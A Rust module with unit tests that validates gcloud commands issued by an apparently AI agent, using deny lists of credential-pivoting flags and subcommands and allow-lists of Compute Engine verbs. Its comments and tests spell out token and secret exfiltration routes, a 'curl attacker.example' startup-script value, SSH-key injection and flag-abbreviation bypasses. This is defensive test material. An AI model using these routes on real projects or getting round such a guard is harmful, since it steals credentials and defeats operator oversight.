use anyhow::{Result, anyhow};

/// First-token subcommand groups that are always denied, regardless of the
/// allow-list below. These would let the agent print/rotate credentials,
/// manage billing/IAM/projects, or repoint the pinned identity/project.
const DENY_FIRST_TOKENS: &[&str] = &[
    "auth",
    "iam",
    "billing",
    "projects",
    "kms",
    "secrets",
    "resource-manager",
    "organizations",
    "config",
];

/// Flags that could pivot off the pinned, pre-authenticated service-account
/// identity or project (impersonation, alternate credential files, a
/// different gcloud "configuration"/account, an unpinned `--project`, a
/// caller-chosen local write destination such as `compute instances export
/// --destination=<path>`, or an over-privileged identity attached to a
/// brand-new instance). Denied anywhere in argv regardless of subcommand.
/// Matched against the flag *name* (the portion of the argument before `=`)
/// via [`matches_or_abbreviates`], so both the exact spelling (`--account=x`)
/// AND any unambiguous prefix abbreviation `gcloud` itself would expand to it
/// (`--acc=x`) are caught — see that function's doc for why prefix matching
/// is safe to apply fail-closed. `--project` is caller-supplied-only
/// forbidden here; the server injects its own `--project=<configured>` in
/// `gcloud::build_gcloud_argv` after this validation passes.
///
/// `--service-account` and `--scopes` are denied on `compute instances
/// create` (and anywhere else) because they let the caller attach an
/// arbitrary — or the project's broad default — service account with an
/// unrestricted OAuth scope (e.g. `--scopes=cloud-platform`) to a
/// self-created VM. Combined with the still-allowed inline
/// `--metadata=startup-script=...`, an attacker-controlled startup script
/// running on that VM can fetch a live, scoped OAuth token from the
/// instance metadata server and exfiltrate it — obtaining a credential far
/// more powerful than the pinned key, without ever touching the local key
/// file, `add-metadata`, or any other flag this guard denies.
const DENY_FLAGS: &[&str] = &[
    "--account",
    "--configuration",
    "--impersonate-service-account",
    "--key-file",
    "--credential-file-override",
    "--project",
    "--destination",
    "--service-account",
    "--scopes",
];

/// Full flag names, known to load content from an arbitrary local file, used
/// as abbreviation-prefix-matching targets in [`is_local_file_flag`] (via
/// [`matches_or_abbreviates`]) so a truncated form gcloud would still expand
/// to one of these (e.g. `--metadata-from-fil` -> `--metadata-from-file`) is
/// caught even though it doesn't itself end in "-file"/contain "-from-file".
/// Illustrative, not exhaustive — see [`is_local_file_flag`]'s doc for the
/// general substring heuristic that remains the catch-all for full
/// (non-abbreviated) flag names not enumerated here.
const KNOWN_LOCAL_FILE_FLAGS: &[&str] = &[
    "--metadata-from-file",
    "--flags-file",
    "--source-instance-template-file",
    "--config-from-file",
    "--certificate-file",
    "--private-key-file",
    "--csek-key-file",
];

/// Flags that are genuine, standalone gcloud flags in their own right and
/// must never be treated as an abbreviation of anything, even though they
/// happen to be a literal text prefix of a flag in [`KNOWN_LOCAL_FILE_FLAGS`]
/// or [`DENY_FLAGS`]. The concrete case: `--metadata` (allowed — see
/// `test_allows_inline_metadata_on_create_but_not_mutation_verbs`) is a
/// complete, distinct flag from `--metadata-from-file`, sharing only a
/// naming-convention stem gcloud itself uses for its `--from-file` variants.
/// Since `--metadata` exactly matches a real flag, gcloud parses it as
/// itself — never as an ambiguous abbreviation of the longer name — so it
/// must not be denied. A strictly *shorter* abbreviation of `--metadata`
/// (e.g. `--meta`) is NOT exempted here: that string is genuinely ambiguous
/// between `--metadata` and `--metadata-from-file` in real gcloud (which
/// would itself refuse to run rather than pick one), so denying it
/// preemptively is still safe and correct.
const KNOWN_SAFE_EXACT_FLAGS: &[&str] = &["--metadata"];

/// Returns whether `name` (a `--`-prefixed flag argument, already lowercased)
/// exactly matches, or is an unambiguous-abbreviation prefix of, any flag in
/// `full_names`.
///
/// `gcloud` resolves any prefix of a flag's full name to that flag as long as
/// it is unambiguous among the flags available on the invoked command, so
/// exact-string denylist matching alone can be bypassed by a caller passing a
/// shortened form (e.g. `--scope=cloud-platform` for `--scopes`,
/// `--service-acc=...` for `--service-account`). Denying on prefix match is
/// safe to apply fail-closed: if the abbreviation were ambiguous with some
/// *other*, unrelated flag, gcloud itself would refuse to run rather than
/// silently pick one — so this can never reject a call that gcloud would
/// have accepted as a genuinely different flag, only ones that would have
/// resolved to (or ambiguously included) a flag we deny anyway. Requires at
/// least one character after `--` so the bare separator `--` itself (used by
/// some CLIs to end flag parsing) is never treated as a match.
fn matches_or_abbreviates(name: &str, full_names: &[&str]) -> bool {
    name.len() > 2 && full_names.iter().any(|full| full.starts_with(name))
}

/// Per-resource-group verb allow-lists (the third argv token). The resource
/// group alone is not a sufficient boundary: several verbs available under
/// an otherwise in-scope group are far more privileged than plain instance
/// lifecycle management and are excluded even though the group is listed,
/// most importantly:
/// - `compute instances add-metadata` / `remove-metadata` / `update`, which
///   let the caller inject an SSH key or startup-script into ANY existing
///   instance in the project (not just ones behind this tool), bypassing the
///   SSH IP/alias whitelist entirely.
/// - `compute instances export` / `import`, which read/write an
///   attacker-chosen local file path.
/// - any mutating verb on `firewall-rules`/`networks` (e.g. `create
///   --allow=tcp:22 --source-ranges=0.0.0.0/0`), which can expose any
///   instance in the project to the public internet; these two groups are
///   confined to read-only inspection.
const ALLOWED_VERBS: &[(&str, &str, &[&str])] = &[
    (
        "compute",
        "instances",
        &[
            "list",
            "describe",
            "start",
            "stop",
            "reset",
            "delete",
            "create",
            "set-machine-type",
        ],
    ),
    (
        "compute",
        "disks",
        &["list", "describe", "create", "delete", "resize"],
    ),
    ("compute", "firewall-rules", &["list", "describe"]),
    (
        "compute",
        "snapshots",
        &["list", "describe", "create", "delete"],
    ),
    ("compute", "images", &["list", "describe"]),
    ("compute", "networks", &["list", "describe"]),
];

/// Renders the permitted resource-group/verb combinations from
/// [`ALLOWED_VERBS`] for the rejection error message. Built dynamically
/// (rather than a hand-maintained literal string) so the message can never
/// drift out of sync with the actual allow-list if `ALLOWED_VERBS` is edited.
fn describe_allowed_verbs() -> String {
    ALLOWED_VERBS
        .iter()
        .map(|(group0, group1, verbs)| format!("{} {} {{{}}}", group0, group1, verbs.join(",")))
        .collect::<Vec<_>>()
        .join("; ")
}

/// Returns the flag *name* portion of an argv element: everything before an
/// `=`, e.g. `--metadata-from-file=leak=/tmp/x` -> `--metadata-from-file`.
/// Positional (non-flag) arguments are returned unchanged, which is safe
/// since callers only compare the result against `--`-prefixed names.
fn flag_name(arg: &str) -> &str {
    arg.split('=').next().unwrap_or(arg)
}

/// Returns whether `name` (already lowercased, flag-name-only, and required
/// by the caller to actually be a `--`-prefixed flag — enforced here via a
/// debug assertion, since [`validate_gcloud_args`] is the only caller and
/// must gate on that precondition before invoking this function) loads
/// content from an arbitrary local file path. gcloud exposes many such flags
/// (`--metadata-from-file`, `--flags-file`, per-resource `*-from-file`
/// variants, …) and enumerating every one by name would always be
/// incomplete, so the whole class is denied: any of them can be used to read
/// a local secret file's bytes into a resource (e.g. instance metadata) that
/// a subsequent allowed `describe`/`list` call then echoes back through the
/// (pattern-only-scrubbed) tool result, defeating the "secrets are never
/// exposed to the agent" model the same way reading `~/.ssh/id_rsa` would on
/// the SSH path.
///
/// Two layers: the substring heuristic below catches any *full* (i.e.
/// non-abbreviated) flag name that says "file", and
/// [`matches_or_abbreviates`] against [`KNOWN_LOCAL_FILE_FLAGS`] additionally
/// catches truncated forms of those specific known flags that gcloud's
/// flag-prefix abbreviation would still expand to them (e.g.
/// `--metadata-from-fil`). Neither layer is an exhaustive enumeration of
/// gcloud's entire flag surface: a future flag that loads a local file
/// without matching either substring (e.g. a hypothetical
/// `--startup-script-uri`-style alias that doesn't say "file"), or an
/// abbreviation of a local-file flag not yet added to
/// `KNOWN_LOCAL_FILE_FLAGS`, would silently slip through. Extend this
/// function, `KNOWN_LOCAL_FILE_FLAGS`, or `DENY_FLAGS` if one is found; treat
/// this as needing periodic re-audit as gcloud's Compute Engine flag surface
/// evolves.
fn is_local_file_flag(name: &str) -> bool {
    debug_assert!(
        name.starts_with("--"),
        "is_local_file_flag must only be called with a --prefixed flag name"
    );
    if KNOWN_SAFE_EXACT_FLAGS.contains(&name) {
        return false;
    }
    name.ends_with("-file")
        || name.contains("-from-file")
        || matches_or_abbreviates(name, KNOWN_LOCAL_FILE_FLAGS)
}

/// Validates a `gcloud` argv before it is executed locally.
///
/// Three layers of protection, mirroring `command_guard::validate_command`
/// but operating on a structured argv (not a shell string), which sidesteps
/// shell injection entirely:
/// 1. A denylist that always blocks credential-affecting subcommands
///    (`auth`, `iam`, `billing`, `projects`, `kms`, `secrets`,
///    `resource-manager`, `organizations`, `config`), identity/project/scope
///    pivoting flags (`--account`, `--impersonate-service-account`,
///    `--project`, `--service-account`, `--scopes`, etc.), and any flag that
///    reads from or writes to an arbitrary local file path
///    (`--metadata-from-file`, `--flags-file`, `--destination`, …) —
///    regardless of the allow-list. Flag matching is NOT plain exact-string
///    comparison: `gcloud` resolves any unambiguous prefix abbreviation of a
///    flag's full name (e.g. `--scope=` for `--scopes=`, `--service-acc=` for
///    `--service-account=`) to that flag, so [`matches_or_abbreviates`] is
///    used instead of a bare equality/`.contains()` check — see its doc for
///    why prefix matching is safe to apply fail-closed.
/// 2. A fail-closed allow-list on the resource group (first two tokens):
///    only `compute instances|disks|firewall-rules|snapshots|images|networks`.
/// 3. A fail-closed allow-list on the *verb* (third token) within that
///    group, since the group alone is not a sufficient boundary — see
///    [`ALLOWED_VERBS`].
pub fn validate_gcloud_args(args: &[String]) -> Result<()> {
    if args.is_empty() {
        return Err(anyhow!(
            "Security Error: empty gcloud command is not permitted"
        ));
    }

    // Layer 1a: deny credential/identity-affecting subcommands by first token.
    let first = args[0].to_lowercase();
    if DENY_FIRST_TOKENS.contains(&first.as_str()) {
        return Err(anyhow!(
            "Security Error: gcloud subcommand '{}' is not permitted. This tool is \
             pre-authenticated and scoped to Compute Engine resource management; \
             credential, IAM, billing, and project administration are blocked.",
            first
        ));
    }

    // Layer 1b: deny identity/project-pivoting flags and local-file-reading
    // flags anywhere in argv. Only arguments that are actually `--`-prefixed
    // flags are checked — a positional resource name that happens to end in
    // "-file" (gcloud permits instance/disk names like "backup-file") must
    // not be misidentified as a denied flag and cause an otherwise fully
    // allowed call (e.g. `describe`/`list`/`start`/`delete` on that
    // resource) to be rejected.
    for arg in args {
        let lowered = arg.to_lowercase();
        if !lowered.starts_with("--") {
            continue;
        }
        let name = flag_name(&lowered);
        if matches_or_abbreviates(name, DENY_FLAGS) {
            return Err(anyhow!(
                "Security Error: the '{}' flag is not permitted (exactly or as an \
                 abbreviation of a denied flag) because it can pivot off the pinned \
                 service-account identity, project, or an over-privileged OAuth scope.",
                name
            ));
        }
        if is_local_file_flag(name) {
            return Err(anyhow!(
                "Security Error: the '{}' flag is not permitted because it reads \
                 from or writes to an arbitrary local file path, which could leak \
                 local secrets or write untrusted data to disk.",
                name
            ));
        }
    }

    // Layer 2/3: fail-closed allow-list on resource group AND verb.
    if args.len() < 3 {
        return Err(anyhow!(
            "Security Error: gcloud command must specify a resource group and a verb \
             (e.g. 'compute instances list')."
        ));
    }
    let group1 = args[1].to_lowercase();
    let verb = args[2].to_lowercase();
    let allowed = ALLOWED_VERBS
        .iter()
        .find(|(a, b, _)| first == *a && group1 == *b)
        .map(|(_, _, verbs)| verbs.contains(&verb.as_str()))
        .unwrap_or(false);
    if !allowed {
        return Err(anyhow!(
            "Security Error: gcloud command is not in the allowed resource-group/verb \
             list. Permitted: {}.",
            describe_allowed_verbs()
        ));
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn test_allows_compute_instances_verbs() {
        for verb in [
            "list",
            "start",
            "stop",
            "reset",
            "create",
            "delete",
            "describe",
            "set-machine-type",
        ] {
            assert!(
                validate_gcloud_args(&args(&["compute", "instances", verb])).is_ok(),
                "expected 'compute instances {}' to be allowed",
                verb
            );
        }
    }

    #[test]
    fn test_allows_other_compute_resource_groups_read_only_verbs() {
        assert!(validate_gcloud_args(&args(&["compute", "disks", "list"])).is_ok());
        assert!(validate_gcloud_args(&args(&["compute", "firewall-rules", "list"])).is_ok());
        assert!(validate_gcloud_args(&args(&["compute", "snapshots", "list"])).is_ok());
        assert!(validate_gcloud_args(&args(&["compute", "images", "list"])).is_ok());
        assert!(validate_gcloud_args(&args(&["compute", "networks", "list"])).is_ok());
        assert!(validate_gcloud_args(&args(&["compute", "disks", "resize", "d1"])).is_ok());
        assert!(validate_gcloud_args(&args(&["compute", "snapshots", "delete", "s1"])).is_ok());
    }

    #[test]
    fn test_denies_metadata_mutation_verbs_on_instances() {
        // add-metadata/remove-metadata/update let a caller inject an SSH key
        // or startup-script into ANY existing instance in the project,
        // bypassing the SSH IP/alias whitelist entirely — must stay denied
        // even though 'compute instances' is otherwise an allowed group.
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "add-metadata",
                "victim-vm",
                "--metadata=ssh-keys=attacker:ssh-rsa AAAA"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "remove-metadata",
                "victim-vm"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&["compute", "instances", "update", "victim-vm"])).is_err()
        );
    }

    #[test]
    fn test_denies_export_import_verbs_on_instances() {
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "export",
                "my-vm",
                "--destination=/tmp/out.yaml"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "import",
                "my-vm",
                "--source=/tmp/in.yaml"
            ]))
            .is_err()
        );
    }

    #[test]
    fn test_denies_mutating_verbs_on_firewall_rules_and_networks() {
        // Read-only inspection is permitted; creating/updating/deleting
        // firewall rules or networks could expose any instance in the
        // project to the public internet and must stay denied.
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "firewall-rules",
                "create",
                "allow-ssh",
                "--allow=tcp:22",
                "--source-ranges=0.0.0.0/0"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&["compute", "firewall-rules", "update", "allow-ssh"]))
                .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&["compute", "firewall-rules", "delete", "allow-ssh"]))
                .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&["compute", "networks", "create", "evil-net"])).is_err()
        );
    }

    #[test]
    fn test_denies_local_file_reading_flags_even_on_allowed_verb() {
        // The primary secret-exfiltration vector: read an arbitrary local
        // file's bytes into instance metadata at creation time, then read
        // them back via an otherwise-allowed 'describe' call.
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "create",
                "new-vm",
                "--metadata-from-file=leak=/Users/someone/.remote_connections/mcp_secrets.json"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--flags-file=/tmp/flags.yaml"
            ]))
            .is_err()
        );
    }

    #[test]
    fn test_positional_resource_name_ending_in_file_is_not_misflagged() {
        // Regression test: gcloud permits resource names like "backup-file"
        // or "web-file"; the local-file-flag heuristic must only apply to
        // actual `--`-prefixed flags, not positional arguments, or an
        // otherwise fully allowed call on such a resource would be wrongly
        // rejected.
        assert!(
            validate_gcloud_args(&args(&["compute", "instances", "describe", "backup-file"]))
                .is_ok()
        );
        assert!(
            validate_gcloud_args(&args(&["compute", "instances", "start", "web-file"])).is_ok()
        );
        assert!(validate_gcloud_args(&args(&["compute", "disks", "delete", "data-file"])).is_ok());
    }

    #[test]
    fn test_denies_service_account_and_scopes_flags_on_create() {
        // A caller-supplied --service-account and/or --scopes on `compute
        // instances create` would let the agent attach an over-privileged
        // (e.g. cloud-platform-scoped) identity to a self-created VM, then
        // use an inline --metadata=startup-script=... (still allowed for
        // normal provisioning) to exfiltrate a live OAuth token from that
        // VM's metadata server — a far more powerful credential than the
        // pinned service-account key, obtained without touching the local
        // key file or any other denied flag.
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "create",
                "evil-vm",
                "--zone=us-central1-a",
                "--scopes=cloud-platform",
                "--metadata=startup-script=curl attacker.example"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "create",
                "evil-vm",
                "--service-account=other-sa@my-project.iam.gserviceaccount.com"
            ]))
            .is_err()
        );
        // Also denied on other allowed verbs, not just create.
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "describe",
                "my-vm",
                "--scopes=cloud-platform"
            ]))
            .is_err()
        );
    }

    #[test]
    fn test_denies_unambiguous_flag_abbreviations_of_denied_flags() {
        // gcloud resolves any unambiguous prefix of a flag's full name to
        // that flag, so exact-string denylist matching alone is bypassable
        // by a shortened form. Every DENY_FLAGS entry must also be caught
        // via a truncated abbreviation.
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "create",
                "evil-vm",
                "--scope=cloud-platform"
            ]))
            .is_err(),
            "--scope must be denied as an abbreviation of --scopes"
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "create",
                "evil-vm",
                "--service-acc=attacker@x.iam.gserviceaccount.com"
            ]))
            .is_err(),
            "--service-acc must be denied as an abbreviation of --service-account"
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--acc=other@x.iam.gserviceaccount.com"
            ]))
            .is_err(),
            "--acc must be denied as an abbreviation of --account"
        );
        assert!(
            validate_gcloud_args(&args(&["compute", "instances", "list", "--projec=other"]))
                .is_err(),
            "--projec must be denied as an abbreviation of --project"
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--key-fil=/tmp/key.json"
            ]))
            .is_err(),
            "--key-fil must be denied as an abbreviation of --key-file"
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "export",
                "my-vm",
                "--destinatio=/tmp/out.yaml"
            ]))
            .is_err(),
            "--destinatio must be denied as an abbreviation of --destination"
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--configuratio=other"
            ]))
            .is_err(),
            "--configuratio must be denied as an abbreviation of --configuration"
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--impersonate-service-accoun=x@y.iam.gserviceaccount.com"
            ]))
            .is_err(),
            "--impersonate-service-accoun must be denied as an abbreviation"
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--credential-file-overrid=/tmp/x"
            ]))
            .is_err(),
            "--credential-file-overrid must be denied as an abbreviation"
        );
    }

    #[test]
    fn test_denies_abbreviated_local_file_flag() {
        // Truncated form of a known local-file-loading flag that gcloud
        // would still expand unambiguously — the primary Major-severity gap
        // this fix closes.
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "create",
                "new-vm",
                "--metadata-from-fil=leak=/Users/someone/.remote_connections/mcp_secrets.json"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--flags-fil=/tmp/x"
            ]))
            .is_err()
        );
    }

    #[test]
    fn test_flag_abbreviation_check_does_not_flag_unrelated_allowed_flags() {
        // The exact, complete --metadata flag (distinct from
        // --metadata-from-file) must remain allowed: gcloud only resolves an
        // abbreviation when the supplied token does not itself already name
        // a real flag, so a caller passing the genuine, complete --metadata
        // flag is never routed through abbreviation expansion toward
        // --metadata-from-file, and this guard must not conflate the two.
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "create",
                "new-vm",
                "--metadata=startup-script=echo hi"
            ]))
            .is_ok()
        );
        // Common, unrelated flags used across the recipes/README must not be
        // caught by the new prefix-matching logic.
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "create",
                "new-vm",
                "--machine-type=e2-micro",
                "--zone=us-central1-a"
            ]))
            .is_ok()
        );
    }

    #[test]
    fn test_allows_inline_metadata_on_create_but_not_mutation_verbs() {
        // Setting metadata as part of creating a NEW instance (the agent's
        // own resource) is normal instance-management usage and stays
        // allowed; only mutating an EXISTING instance's metadata via
        // add-metadata/remove-metadata/update is denied (see above).
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "create",
                "new-vm",
                "--metadata=startup-script=echo hi"
            ]))
            .is_ok()
        );
    }

    #[test]
    fn test_denies_iam_billing_projects_auth() {
        assert!(validate_gcloud_args(&args(&["iam", "service-accounts", "list"])).is_err());
        assert!(validate_gcloud_args(&args(&["billing", "accounts", "list"])).is_err());
        assert!(validate_gcloud_args(&args(&["auth", "print-access-token"])).is_err());
        assert!(validate_gcloud_args(&args(&["auth", "print-identity-token"])).is_err());
        assert!(validate_gcloud_args(&args(&["auth", "login"])).is_err());
        assert!(validate_gcloud_args(&args(&["auth", "revoke"])).is_err());
        assert!(validate_gcloud_args(&args(&["projects", "list"])).is_err());
        assert!(validate_gcloud_args(&args(&["kms", "keys", "list"])).is_err());
        assert!(validate_gcloud_args(&args(&["secrets", "list"])).is_err());
        assert!(
            validate_gcloud_args(&args(&["resource-manager", "org-policies", "list"])).is_err()
        );
        assert!(validate_gcloud_args(&args(&["organizations", "list"])).is_err());
        assert!(validate_gcloud_args(&args(&["config", "set", "project", "other"])).is_err());
    }

    #[test]
    fn test_denies_identity_pivoting_flags_even_on_allowed_subcommand() {
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "describe",
                "my-vm",
                "--account=other@x.iam.gserviceaccount.com"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--impersonate-service-account=x@y.iam.gserviceaccount.com"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--configuration=other"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--key-file=/tmp/key.json"
            ]))
            .is_err()
        );
    }

    #[test]
    fn test_denies_caller_supplied_project_flag_so_it_stays_pinned() {
        // The configured project_id must be the only project ever targeted;
        // a caller-supplied --project (even matching the real project) is
        // refused so pinning can never be bypassed by convention alone.
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--project=other-project"
            ]))
            .is_err()
        );
        assert!(
            validate_gcloud_args(&args(&[
                "compute",
                "instances",
                "list",
                "--project=my-project"
            ]))
            .is_err()
        );
    }

    #[test]
    fn test_denies_resource_group_outside_allowlist() {
        assert!(validate_gcloud_args(&args(&["compute", "routers", "list"])).is_err());
        assert!(validate_gcloud_args(&args(&["container", "clusters", "list"])).is_err());
        assert!(validate_gcloud_args(&args(&["storage", "ls"])).is_err());
        assert!(validate_gcloud_args(&args(&["compute"])).is_err());
        assert!(validate_gcloud_args(&args(&["compute", "instances"])).is_err());
    }

    #[test]
    fn test_benign_near_miss_resource_named_like_denylist_is_not_falsely_flagged() {
        // A resource literally named 'iam-server' passed as an argument value
        // (not the first token / a subcommand) must not be denied.
        assert!(
            validate_gcloud_args(&args(&["compute", "instances", "describe", "iam-server"]))
                .is_ok()
        );
    }

    #[test]
    fn test_empty_args_rejected() {
        assert!(validate_gcloud_args(&[]).is_err());
    }

    #[test]
    fn test_denylist_checked_before_allowlist_ordering_does_not_bypass() {
        // Even though 'auth' fails the allow-list too, this test documents
        // that the specific, actionable denylist error fires first.
        let err = validate_gcloud_args(&args(&["auth", "print-access-token"])).unwrap_err();
        assert!(err.to_string().contains("is not permitted"));
    }
}
